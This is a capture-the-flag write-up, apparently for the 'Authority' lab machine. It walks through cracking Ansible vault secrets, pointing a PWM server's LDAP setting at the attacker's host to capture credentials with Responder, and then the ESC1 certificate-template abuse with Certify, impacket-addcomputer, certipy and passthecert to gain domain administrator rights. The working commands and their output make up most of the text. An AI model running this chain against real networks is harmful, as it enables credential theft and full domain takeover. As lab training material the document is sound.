```
smbclient -N //10.10.11.222/Development
```

Then I downloaded the machine to my computer using `mget Development`

I found many interesting files, but the most important was  on this path `/Automation/Ansible/PWM/main.yml`:

```
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
│ File: main.yml
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
1 │ ---
2 │ pwm_run_dir: "{{ lookup('env', 'PWD') }}"
3 │
4 │ pwm_hostname: authority.htb.corp
5 │ pwm_http_port: "{{ http_port }}"
6 │ pwm_https_port: "{{ https_port }}"
7 │ pwm_https_enable: true
8 │
9 │ pwm_require_ssl: false
10 │
11 │ pwm_admin_login: !vault |
12 │ $ANSIBLE_VAULT;1.1;AES256
13 │ 32666534386435366537653136663731633138616264323230383566333966346662313161326239
14 │ 6134353663663462373265633832356663356239383039640a346431373431666433343434366139
15 │ 35653634376333666234613466396534343030656165396464323564373334616262613439343033
16 │ 6334326263326364380a653034313733326639323433626130343834663538326439636232306531
17 │ 3438
18 │
19 │ pwm_admin_password: !vault |
20 │ $ANSIBLE_VAULT;1.1;AES256
21 │ 31356338343963323063373435363261323563393235633365356134616261666433393263373736
22 │ 3335616263326464633832376261306131303337653964350a363663623132353136346631396662
23 │ 38656432323830393339336231373637303535613636646561653637386634613862316638353530
24 │ 3930356637306461350a316466663037303037653761323565343338653934646533663365363035
25 │ 6531
26 │
27 │ ldap_uri: ldap://127.0.0.1/
28 │ ldap_base_dn: "DC=authority,DC=htb"
29 │ ldap_admin_password: !vault |
30 │ $ANSIBLE_VAULT;1.1;AES256
31 │ 63303831303534303266356462373731393561313363313038376166336536666232626461653630
32 │ 3437333035366235613437373733316635313530326639330a643034623530623439616136363563
33 │ 34646237336164356438383034623462323531316333623135383134656263663266653938333334
34 │ 3238343230333633350a646664396565633037333431626163306531336336326665316430613566
35 │ 3764
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```


I save the three hashes on different files value1.txt , value2.txt and value3.txt.

First of all,  I need to change the format of the file, the same has the hash on different lines, so I need to put it just in two lines, like this:

```
1|$ANSIBLE_VAULT;1.1;AES256
2|63303831303534303266356462373731393561313363313038376166336536666232626461653630
 |3437333035366235613437373733316635313530326639330a643034623530623439616136363563
 |34646237336164356438383034623462323531316333623135383134656263663266653938333334
 |3238343230333633350a646664396565633037333431626163306531336336326665316430613566
 |3764

```

The next step is  use  the command `ansible2john` to have the right hash format and crack it 

```
ansible2john pwn_admin_password.txt

pwn_admin_password.txt:$ansible$0*0*15c849c20c74562a25c925c3e5a4abafd39c77635abc2ddc827ba0a1037e9d5*1dff07007e7a25e438e94de3fe605e1*66cb12516419fb8ed22809393b1767055a66deae678f4a8b18550905f70da5
```


Now I needed to crack this hashes with `hashcat --example-hashes ansible` I found that there is a format called ansible, and the number was 16900


`hashcat -m 16900 -a 0 value1.txt /usr/share/wordlists/rockyou.txt`

Strangely , when I cracked the other two values, all of them give me the same result: `!@#$%^&*`

So, I discover that existed a tool called "`ansible-vault`" and it is used to decrypt this hashes, but it needs a password, the password is `!@#$%^&*`

So this is the command:

```
kali> ansible-vault decrypt 
Vault password:
xxxxxxxx
```

ansible-vault decrypt value1 =xxxxxxxxx

ansible-vault decrypt value2 = xxxxxxxxx

ansible-vault decrypt value3 = xxxxxxxxx

One of this three values helped me to get inside of the configuration panel of the site on https://10.10.11.222/8443

The first thing that I did was click on "download configuration" The idea now was modify the configuration file, changing the values. Why? because with responder we can intercept the credentials when we upload the file, and it ony suports ldap and it does not support ldaps

```
from:

<setting key="ldap.serverUrls" modifyTime="2022-08-11T01:46:23Z" profile="default" syntax="STRING_ARRAY">

<label>LDAP ⇨ LDAP Directories ⇨ default ⇨ Connection ⇨ LDAP URLs</label>
<value>ldaps://manager.manager.htb</value>

to:

<setting key="ldap.serverUrls" modifyTime="2022-08-11T01:46:23Z" profile="default" syntax="STRING_ARRAY">

<label>LDAP ⇨ LDAP Directories ⇨ default ⇨ Connection ⇨ LDAP URLs</label>
<value>ldaps://10.10.16.86:389</value>
```


To listen successfully , i need to change the settings like this:
```
Change the settings on the “Configuration editor ” NO the “Configuration manager”
LDAP > LDAP DIRECTORIES > DEFAULT > CONNECTION

Add the value ldap://10.10.16.86.389 on the connections column.
```

The idea is upload the file while I listen with the responder

```
sudo responder -I tun0
```


And then I retrieve the credentials:

```
[LDAP] Cleartext Client : 10.10.11.222
[LDAP] Cleartext Username : CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb
[LDAP] Cleartext Password : *******
```

Now I can log in with evil winrm and cat the usr flag

```
evil-winrm -u svc_ldap -p <Password> -i 10.10.11.222 -P 5985
```

## ROOT:

When I get the access I watched my privileges:
```
*Evil-WinRM* PS C:\> whoami /priv

PRIVILEGES INFORMATION

----------------------

Privilege Name Description State

============================= ============================== =======
SeMachineAccountPrivilege Add workstations to domain Enabled
SeChangeNotifyPrivilege Bypass traverse checking Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

So, I have a permission for me to add workstations. And there is another folder called "Certs" on the path `C:\`

The next step was search for some weak certs , I used `certify.exe`

I use
`upload Certify.exe c:\users\svc_ldap\documents\Certify.exe`

And then the next command was:

```
certify.exe find /vulnerable
```


And then I found this :
```
[!] Vulnerable Certificates Templates :

CA Name : authority.authority.htb\AUTHORITY-CA
Template Name : CorpVPN
Schema Version : 2
Validity Period : 20 years
Renewal Period : 6 weeks
msPKI-Certificate-Name-Flag : ENROLLEE_SUPPLIES_SUBJECT

mspki-enrollment-flag : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT_CHECK_USER_DS_CERTIFICATE

Authorized Signatures Required : 0

pkiextendedkeyusage : Client Authentication, Document Signing, Encrypting File System, IP security IKE intermediate, IP security user, KDC Authentication, Secure Email

mspki-certificate-application-policy : Client Authentication, Document Signing, Encrypting File System, IP security IKE intermediate, IP security user, KDC Authentication, Secure Email

Permissions

Enrollment Permissions
Enrollment Rights : HTB\Domain Admins S-1-5-21-622327497-3269355298-2248959698-512
HTB\Domain Computers S-1-5-21-622327497-3269355298-2248959698-515
HTB\Enterprise Admins S-1-5-21-622327497-3269355298-2248959698-519

Object Control Permissions
Owner : HTB\Administrator S-1-5-21-622327497-3269355298-2248959698-500
WriteOwner Principals : HTB\Administrator S-1-5-21-622327497-3269355298-2248959698-500
HTB\Domain Admins S-1-5-21-622327497-3269355298-2248959698-512
HTB\Enterprise Admins S-1-5-21-622327497-3269355298-2248959698-519
WriteDacl Principals : HTB\Administrator S-1-5-21-622327497-3269355298-2248959698-500
HTB\Domain Admins S-1-5-21-622327497-3269355298-2248959698-512
HTB\Enterprise Admins S-1-5-21-622327497-3269355298-2248959698-519
WriteProperty Principals : HTB\Administrator S-1-5-21-622327497-3269355298-2248959698-500
HTB\Domain Admins S-1-5-21-622327497-3269355298-2248959698-512
HTB\Enterprise Admins S-1-5-21-622327497-3269355298-2248959698-519

CORP VPN IS A VULNERABLE CERTIFICATE
```

The template CorpVPN is vulnerable

So the next step was create a new computer account. I use `impacket-addcomputer`

```
`impacket-addcomputer authority.htb/<username>:<password> -computer-name COMPUTER$ -computer-pass `Password1234` -dc-ip 10.10.11.222
```

I use certipy-ad, and I generate a certificate request using the computer account "COMPUTER$" with the password "Password1234" and the template "CorpVPN," that is the vulnerable one and I can escalate privileges after

```
certipy-ad req -u 'STX$' -p 'Password123' -ca AUTHORITY-CA -target authority.htb -template CorpVPN -upn administrator@authority.htb -dns authority.authority.htb -debug -dc-ip 10.10.11.222

[+] Trying to resolve 'authority.htb' at '10.10.11.222'
[+] Generating RSA key
[*] Requesting certificate via RPC
[+] Trying to connect to endpoint: ncacn_np:10.10.11.222[\pipe\cert]
[+] Connected to endpoint: ncacn_np:10.10.11.222[\pipe\cert]
[*] Successfully requested certificate
[*] Request ID is 5
[*] Got certificate with multiple identifications

UPN: 'administrator@authority.htb'

DNS Host Name: 'authority.authority.htb'

[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator_authority.pfx'
```

And now I generate two certificates  


One without the private key
```
certipy cert -pfx administrator_authority.pfx -nokey -out user.crt
```

And another without the certificate.
```
certipy cert -pfx administrator_authority.pfx -nocert -out user.key
```


Assets:

[https://tools.thehacker.recipes/impacket/examples/addcomputer.py](https://tools.thehacker.recipes/impacket/examples/addcomputer.py)

[https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation#misconfigured-certificate-templates-esc1](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation#misconfigured-certificate-templates-esc1)

[https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html](https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html)

Now I downloaded the passthecert.py tool that It permites me to log in on the LDAPS using the  certificates and then I can add my user to the administrator's group

```
wget https://raw.githubusercontent.com/AlmondOffSec/PassTheCert/main/Python/passthecert.py
```

Then I used

```
python3 passthecert.py -action ldap-shell -crt user.crt -key user.key -domain authority.htb -dc-ip 10.10.11.222

add_user_to_group svc_ldap Administrators
```

Finally I test if I was successfully on the administrator's group

```
C:\Users\svc_ldap\Documents> net user svc_ldap

User name svc_ldap
Full Name
Comment
User's comment
Country/region code 000 (System Default)
Account active Yes
Account expires Never
Password last set 8/10/2022 9:29:31 PM
Password expires Never
Password changeable 8/11/2022 9:29:31 PM
Password required Yes
User may change password Yes
Workstations allowed All
Logon script
User profile
Home directory
Last logon 10/26/2023 12:35:48 PM
Logon hours allowed All
Local Group Memberships *Administrators *Remote Management Use
Global Group memberships *Domain Users
The command completed successfully.
```

And finally i'm able to get the root flag.